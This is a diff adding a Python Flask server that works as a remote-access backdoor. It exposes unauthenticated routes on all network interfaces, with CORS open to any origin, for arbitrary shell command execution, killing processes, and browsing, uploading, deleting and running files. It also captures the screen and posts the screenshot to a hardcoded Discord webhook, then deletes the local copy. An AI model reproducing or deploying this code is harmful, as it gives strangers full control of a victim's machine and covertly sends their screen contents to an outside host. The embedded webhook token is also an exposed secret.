@@ -1,0 +1,322 @@
+import subprocess
+from flask import Flask, request, jsonify, send_from_directory, render_template_string
+import os
+from PIL import ImageGrab
+import requests
+from flask_cors import CORS
+
+app = Flask(__name__)
+CORS(app, resources={r"/*": {"origins": "*", "methods": ["GET", "POST", "OPTIONS"], "allow_headers": "*"}})
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1314775003081871430/X3xBhkQ0K6ISb-mGpE4R-1yjfKlq-UEsdejT4CeF3RjBjcz5zGe-bGqq_wt_qtkWdj5x"
+BASE_DIRECTORY = os.path.expanduser("~")
+
+@app.route('/kill_task', methods=['POST'])
+def kill_task():
+    try:
+        task_name_or_pid = request.json.get("task")
+        if not task_name_or_pid:
+            return jsonify({"error": "No task name or PID provided"}), 400
+
+        result = subprocess.run(
+            ["taskkill", "/F", "/IM", task_name_or_pid] if not task_name_or_pid.isdigit() else ["taskkill", "/F", "/PID", task_name_or_pid],
+            capture_output=True,
+            text=True,
+            creationflags=subprocess.CREATE_NO_WINDOW  # Suppress console window
+        )
+
+        if result.returncode != 0:
+            return jsonify({"error": result.stderr.strip()}), 500
+
+        return jsonify({"message": f"Task {task_name_or_pid} killed successfully."}), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route('/run_command', methods=['POST'])
+def run_command():
+    try:
+        command = request.json.get("command")
+        if not command:
+            return jsonify({"error": "No command provided"}), 400
+
+        # Execute the command
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+
+        # Return the output and error (if any)
+        return jsonify({
+            "command": command,
+            "output": result.stdout,
+            "error": result.stderr,
+            "return_code": result.returncode
+        }), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/screenshot', methods=['POST'])
+def send_screenshot():
+    try:
+        downloads_dir = os.path.join(BASE_DIRECTORY, "Downloads")
+        os.makedirs(downloads_dir, exist_ok=True)
+
+        screenshot_path = os.path.join(downloads_dir, "screenshot.png")
+        screenshot = ImageGrab.grab()
+        screenshot.save(screenshot_path)
+
+        with open(screenshot_path, "rb") as f:
+            response = requests.post(WEBHOOK_URL, files={"file": f})
+
+        os.remove(screenshot_path)
+
+        if response.status_code == 200:
+            return "Screenshot sent successfully!"
+        else:
+            return f"Failed to send screenshot. Status code: {response.status_code}", 500
+    except Exception as e:
+        return f"Error capturing screenshot: {e}", 500
+
+
+@app.route('/files', methods=['GET', 'POST'])
+def file_browser():
+    directory = request.args.get('dir', BASE_DIRECTORY)
+    directory = os.path.normpath(directory)
+
+    if not os.path.exists(directory):
+        return f"<h1>Directory does not exist: {directory}</h1>", 404
+
+    if request.method == 'POST':
+        if 'file' not in request.files:
+            return "No file part in the request", 400
+        file = request.files['file']
+        if file.filename == '':
+            return "No selected file", 400
+        save_path = os.path.join(directory, file.filename)
+        try:
+            file.save(save_path)
+            return f"File uploaded successfully to {save_path}", 201
+        except Exception as e:
+            return f"Error saving file: {e}", 500
+
+    files = []
+    try:
+        for f in os.listdir(directory):
+            full_path = os.path.join(directory, f)
+            if os.access(full_path, os.R_OK):
+                files.append({"name": f, "is_dir": os.path.isdir(full_path)})
+    except PermissionError:
+        return f"<h1>Permission denied: {directory}</h1>", 403
+
+    parent_dir = os.path.dirname(directory) if directory != BASE_DIRECTORY else None
+    html_template = """
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>File Browser</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 20px; }
+            a { text-decoration: none; color: blue; }
+            a:hover { text-decoration: underline; }
+            .file, .folder { margin: 5px 0; }
+            .folder { font-weight: bold; }
+            .delete, .run { cursor: pointer; margin-left: 10px; }
+            .delete { color: red; }
+            .run { color: green; }
+            .back { margin-bottom: 20px; display: inline-block; }
+        </style>
+    </head>
+    <body>
+        <h1>File Browser</h1>
+        <h2>Current Directory: {{ current_dir }}</h2>
+        {% if parent_dir %}
+            <a class="back" href="/files?dir={{ parent_dir | urlencode }}">⬅ Back to Parent Directory</a>
+        {% endif %}
+        <form method="POST" enctype="multipart/form-data">
+            <input type="file" name="file" required>
+            <button type="submit">Upload</button>
+        </form>
+        <ul>
+            {% for file in files %}
+                {% if file.is_dir %}
+                    <li class="folder">
+                        📁 <a href="/files?dir={{ current_dir }}/{{ file.name | urlencode }}">{{ file.name }}</a>
+                    </li>
+                {% else %}
+                    <li class="file">
+                        📄 {{ file.name }} 
+                        - <a href="/download?dir={{ current_dir | urlencode }}&file={{ file.name | urlencode }}">Download</a>
+                        - <span class="delete" onclick="deleteFile('{{ current_dir | urlencode }}', '{{ file.name | urlencode }}')">Delete</span>
+                        {% if file.name.endswith('.exe') %}
+                            - <span class="run" onclick="runFile('{{ current_dir | urlencode }}', '{{ file.name | urlencode }}')">Run</span>
+                        {% endif %}
+                    </li>
+                {% endif %}
+            {% endfor %}
+        </ul>
+        <script>
+            async function deleteFile(directory, filename) {
+                if (!confirm(`Are you sure you want to delete ${filename}?`)) return;
+
+                const formData = new FormData();
+                formData.append("dir", decodeURIComponent(directory));
+                formData.append("file", decodeURIComponent(filename));
+
+                try {
+                    const response = await fetch("/delete", { method: "POST", body: formData });
+                    if (response.ok) {
+                        alert(`File ${filename} deleted successfully.`);
+                        location.reload();
+                    } else {
+                        const errorText = await response.text();
+                        alert(`Failed to delete file: ${errorText}`);
+                    }
+                } catch (error) {
+                    alert(`Error: ${error.message}`);
+                }
+            }
+
+            async function runFile(directory, filename) {
+                if (!confirm(`Are you sure you want to run ${filename}?`)) return;
+
+                const payload = { dir: decodeURIComponent(directory), file: decodeURIComponent(filename) };
+
+                try {
+                    const response = await fetch("/run_file", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload),
+                    });
+
+                    const result = await response.json();
+                    if (response.ok) alert(`File ${filename} is running.`);
+                    else alert(`Failed to run file: ${result.error || "Unknown error"}`);
+                } catch (error) {
+                    alert(`Error: ${error.message}`);
+                }
+            }
+        </script>
+    </body>
+    </html>
+    """
+    return render_template_string(html_template, files=files, current_dir=directory, parent_dir=parent_dir)
+
+
+@app.route('/run_file', methods=['POST'])
+def run_file():
+    try:
+        directory = request.json.get("dir")
+        filename = request.json.get("file")
+        if not directory or not filename:
+            return jsonify({"error": "Directory or file name not provided"}), 400
+
+        file_path = os.path.join(os.path.normpath(directory), filename)
+        if not os.path.exists(file_path):
+            return jsonify({"error": "File does not exist"}), 404
+
+        subprocess.Popen([file_path], cwd=directory)
+        return jsonify({"message": f"File {filename} is running"}), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route('/list_tasks', methods=['GET'])
+def list_tasks():
+    try:
+        # Run tasklist command with suppressed console window
+        result = subprocess.run(
+            ["tasklist"],
+            capture_output=True,
+            text=True,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        if result.returncode != 0:
+            return f"<h1>Error: {result.stderr.strip()}</h1>", 500
+
+        tasks = []
+        lines = result.stdout.splitlines()
+
+        # Skip the header rows (first three lines)
+        for line in lines[3:]:
+            parts = line.split(maxsplit=1)  # Split the line into task name and remaining details
+            if len(parts) >= 2:
+                task_info = parts[1].split()  # Split the remaining details to get PID
+                task_name = parts[0]
+                pid = task_info[0] if task_info else "Unknown"
+                tasks.append({"name": task_name, "pid": pid})
+
+        # Generate HTML Table
+        html_table = """
+        <html>
+        <head>
+            <title>Task List</title>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    margin: 20px;
+                }
+                table {
+                    width: 80%;
+                    border-collapse: collapse;
+                    margin: 20px auto;
+                }
+                th, td {
+                    border: 1px solid #ddd;
+                    padding: 8px;
+                    text-align: left;
+                }
+                th {
+                    background-color: #f2f2f2;
+                }
+                tr:nth-child(even) {
+                    background-color: #f9f9f9;
+                }
+            </style>
+        </head>
+        <body>
+            <h1 style="text-align: center;">Running Tasks</h1>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Task Name</th>
+                        <th>PID</th>
+                    </tr>
+                </thead>
+                <tbody>
+        """
+        for task in tasks:
+            html_table += f"<tr><td>{task['name']}</td><td>{task['pid']}</td></tr>"
+
+        html_table += """
+                </tbody>
+            </table>
+        </body>
+        </html>
+        """
+        return html_table, 200
+    except Exception as e:
+        return f"<h1>Error: {str(e)}</h1>", 500
+
+
+@app.route('/delete', methods=['POST'])
+def delete_file():
+    directory = request.form.get('dir')
+    filename = request.form.get('file')
+    directory = os.path.normpath(directory)
+    file_path = os.path.normpath(os.path.join(directory, filename))
+
+    if not os.path.exists(file_path):
+        return f"File does not exist: {file_path}", 404
+
+    if os.path.isdir(file_path):
+        return "Cannot delete directories", 400
+
+    try:
+        os.remove(file_path)
+        return f"File {filename} deleted successfully.", 200
+    except Exception as e:
+        return f"Error deleting file: {e}", 500
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)
